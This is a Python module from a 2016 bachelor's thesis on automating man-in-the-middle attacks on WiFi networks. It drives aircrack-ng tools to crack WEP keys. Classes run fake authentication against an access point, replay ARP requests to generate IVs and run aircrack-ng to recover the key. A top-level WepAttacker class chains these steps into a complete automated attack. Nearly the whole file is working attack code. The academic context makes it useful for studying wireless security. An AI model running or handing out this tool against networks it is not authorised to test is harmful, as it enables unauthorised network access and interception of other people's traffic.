#!/usr/bin/env python3
"""
WEP cracking

Automatization of MitM Attack on WiFi Networks
Bachelor's Thesis UIFS FIT VUT
Martin Vondracek
2016
"""

from model import *

__author__ = 'Martin Vondracek'
__email__ = 'xvondr20@stud.fit.vutbr.cz'


class FakeAuthentication(object):
    """
    The  fake authentication attack allows you to perform the two types of WEP authentication (Open System and
    Shared Key) plus associate with the access point (AP). This is only useful when you need  an associated  MAC
    address in various aireplay-ng attacks and there is currently no associated client.
    It should be noted that the fake authentication attack does NOT generate any ARP packets.
    Fake authentication cannot be used to authenticate/associate with WPA/WPA2 Access Points.

    `fake_authentication[Aircrack-ng] <http://www.aircrack-ng.org/doku.php?id=fake_authentication>`_
    """

    def __init__(self, interface, ap, attacker_mac):
        self.interface = interface
        self.ap = ap
        self.attacker_mac = attacker_mac

        self.process = None

    def start(self, reassoc_delay=30, keep_alive_delay=5):
        """
        :param reassoc_delay: reassociation timing in seconds
        :param keep_alive_delay: time between keep-alive packets
        """
        cmd = ['aireplay-ng',
               '--fakeauth', str(reassoc_delay),
               '-q', str(keep_alive_delay),
               '-a', self.ap.bssid,
               '-h', self.attacker_mac,
               self.interface]
        self.process = subprocess.Popen(cmd)
        logging.debug('FakeAuthentication started')

    def stop(self):
        if self.process:
            exitcode = self.process.poll()
            if exitcode is None:
                self.process.terminate()
                time.sleep(1)
                self.process.kill()
                exitcode = self.process.poll()
                logging.debug('FakeAuthentication killed')

            self.process = None
            return exitcode


class ArpReplay(object):
    """
    The classic ARP request replay attack is the most effective way to generate new initialization vectors  (IVs),
    and works very reliably. The program listens for an ARP packet then retransmits it back to the access point.
    This, in turn,  causes  the  access point  to  repeat  the  ARP  packet  with  a new IV. The program retransmits
    the same ARP packet over and over. However, each ARP packet  repeated  by  the  access point has a new IVs.
    It is all these new IVs which allow you to determine the WEP key.

    `arp-request_reinjection[Aircrack-ng]<http://www.aircrack-ng.org/doku.php?id=arp-request_reinjection>`_
    """

    def __init__(self, interface, ap):
        self.interface = interface
        self.ap = ap

        self.process = None
        self.tmp_dir = None

    def start(self, source_mac, input_pcap_path=None):
        """
        Start ARP Replay attack process.
        :param source_mac: Source MAC address for replayed ARP packets
        :param input_pcap_path: Extract ARP packets from this pcap file. If None, packets are captured from interface.
        """
        self.tmp_dir = tempfile.TemporaryDirectory()

        cmd = ['aireplay-ng',
               '--arpreplay',
               '-b', self.ap.bssid,  # MAC address of access point.
               '-h', source_mac]
        # capture or extract packets?
        if input_pcap_path:
            if not os.path.isfile(input_pcap_path):
                raise FileNotFoundError('File does not exist at provided input_pcap_path.')
            cmd.append('-r')
            cmd.append(input_pcap_path)
        cmd.append(self.interface)

        self.process = subprocess.Popen(cmd, cwd=self.tmp_dir.name)
        logging.debug('ArpReplay started, cwd=' + self.tmp_dir.name)

    def stop(self):
        if self.process:
            exitcode = self.process.poll()
            if exitcode is None:
                self.process.terminate()
                time.sleep(1)
                self.process.kill()
                exitcode = self.process.poll()
                logging.debug('ArpReplay killed')

            self.process = None
            self.tmp_dir.cleanup()
            self.tmp_dir = None
            return exitcode


class WepCracker(object):
    """
    Aircrack-ng can recover the WEP key once enough encrypted packets have been captured with airodump-ng. This part
    of the aircrack-ng suite determines the WEP key using two fundamental methods. The first method is via the PTW
    approach (Pyshkin, Tews, Weinmann). The default cracking method is PTW. This is done in two phases. In the first
    phase, aircrack-ng only uses ARP packets. If the key is not found, then it uses all the packets in the capture.
    Please remember that not all packets can be used for the PTW method. This Tutorial: Packets Supported for the PTW
    Attack page provides details. An important limitation is that the PTW attack currently can only crack 40 and 104 bit
    WEP keys. The main advantage of the PTW approach is that very few data packets are required to crack the WEP key.
    The second method is the FMS/KoreK method. The FMS/KoreK method incorporates various statistical attacks
    to discover the WEP key and uses these in combination with brute forcing.

    `aircrack-ng[Aircrack-ng] <http://www.aircrack-ng.org/doku.php?id=aircrack-ng>`_
    """

    def __init__(self, cap_filepath, ap, dir_network_path):
        self.cap_filepath = cap_filepath
        self.ap = ap
        self.dir_network_path = dir_network_path

        self.process = None

    def start(self):
        cmd = ['aircrack-ng',
               '-a', '1',
               '--bssid', self.ap.bssid,
               '-q',  # If set, no status information is displayed.
               '-l', os.path.join(self.dir_network_path, 'WEP_key.hex'),  # Write the key into a file.
               self.cap_filepath]
        self.process = subprocess.Popen(cmd)
        logging.debug('WepCracker started')

    def stop(self):
        if self.process:
            exitcode = self.process.poll()
            if exitcode is None:
                self.process.terminate()
                time.sleep(1)
                self.process.kill()
                exitcode = self.process.poll()
                logging.debug('WepCracker killed')

            self.process = None
            return exitcode

    def has_key(self):
        return os.path.isfile(os.path.join(self.dir_network_path, 'WEP_key.hex'))


class WepAttacker(object):
    """
    Main class providing attack on WEP secured network.
    """
    def __init__(self, dir_network_path, ap, if_mon):
        if not os.path.isdir(dir_network_path):
            raise NotADirectoryError('Provided dir_network_path is not a directory.')
        self.dir_network_path = dir_network_path

        self.ap = ap
        self.if_mon = if_mon
        self.if_mon_mac = '00:36:76:54:b2:95'  # TODO (xvondr20) Get real MAC address of if_mon interface.

    def start(self):
        """
        Start attack on WEP secured network.
        :return:
        """
        with tempfile.TemporaryDirectory() as tmp_dirname:
            capturer = WirelessCapturer(tmp_dir=tmp_dirname, interface=self.if_mon)
            capturer.start(self.ap)

            fake_authentication = FakeAuthentication(interface=self.if_mon, ap=self.ap, attacker_mac=self.if_mon_mac)
            fake_authentication.start()

            arp_replay = ArpReplay(interface=self.if_mon, ap=self.ap)
            arp_replay.start(source_mac=self.if_mon_mac)

            # some time to create capturecapturer.capturing_cap_path
            time.sleep(6)

            cracker = WepCracker(cap_filepath=capturer.capturing_cap_path,
                                 ap=self.ap,
                                 dir_network_path=self.dir_network_path)
            cracker.start()

            iv = capturer.get_iv_sum()

            while not cracker.has_key():
                time.sleep(5)
                iv_curr = capturer.get_iv_sum()
                if iv != iv_curr:
                    iv = iv_curr
                    logging.info('#IV = ' + str(iv))

            capturer.stop()
            arp_replay.stop()
            fake_authentication.stop()
